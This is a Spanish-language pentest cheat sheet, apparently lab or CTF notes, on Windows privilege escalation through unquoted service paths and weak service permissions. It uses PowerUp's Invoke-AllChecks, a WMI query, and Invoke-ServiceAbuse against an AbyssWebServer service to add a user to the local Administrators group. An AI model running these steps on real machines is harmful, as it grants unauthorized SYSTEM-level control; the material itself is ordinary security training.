# Unquoted Service Path

Tags: #PrivEsc #UnquotedServicePaath #Windows 

Ejecuta todos los checks de escalación de privilegios locales de PowerSploit/PowerUp. Identifica servicios con rutas sin comillas (Unquoted Service Path), servicios cuya configuración puede ser modificada por el usuario actual (weak service permissions), binarios de servicios reemplazables, tareas programadas mal configuradas, entre otros vectores comunes de privesc en Windows.

- [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)

```powershell 
❯ Invoke-AllChecks
```

```powershell 
❯ Get-WmiObject -Class win32_service | select pathname     
# Consultar vía WMI la clase 'Win32_Service' y te devuelve el 'PathName' de cada servicio, o sea, la ruta del ejecutable que corre cada servicio del sistema


Que buscar:
	- Rutas sin comillas y con espacios
		C:\WebServer\Abyss Web Server\abyssws.exe -service 
	Ya que Windows ejecutará de la siguiente manera:
		C:\WebServer\Abyss.exe
		C:\WebServer\Abyss Web.exe
		C:\WebServer\Abyss Web Server\abyssws.exe


Que no buscar:
	- La ruta de Windows\System32 no es escribible por usuarios normales
		C:\Windows\System32\
	- Las rutas con comillas tampoco son vulnerables 
		"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
```

## Forma 1 - AbyssWebServer 

```powershell 
# Servicios clave para escalar 
1 AbyssWebServer con Check: 'Unquoted service paths' 
2 AbyssWebServer con Check: 'Modifiable Service Files' y CanRestart: 'True'
3 StartName: LocalSystem 
4 ModifiableFileIdentityReference: Everyone 

---  Hacer el abuso  ---

Paso 1:
❯ Invoke-ServiceAbuse -Name AbyssWebServer -Username 'dominio\usuario'
# Abusa de un servicio con permisos débiles para agregar un usuario al grupo local de administradores. Modifica el binPath del servicio para ejecutar un comando arbitrario como SYSTEM.

Paso 2:
❯ net localgroup Administrators   # Verificar que hemos sido agregado al grupo Administrators 


NOTA:
	- Requiere cerrar sesión y volver a autenticarse para que sean asignados los nuevos permisos en memoria  
```
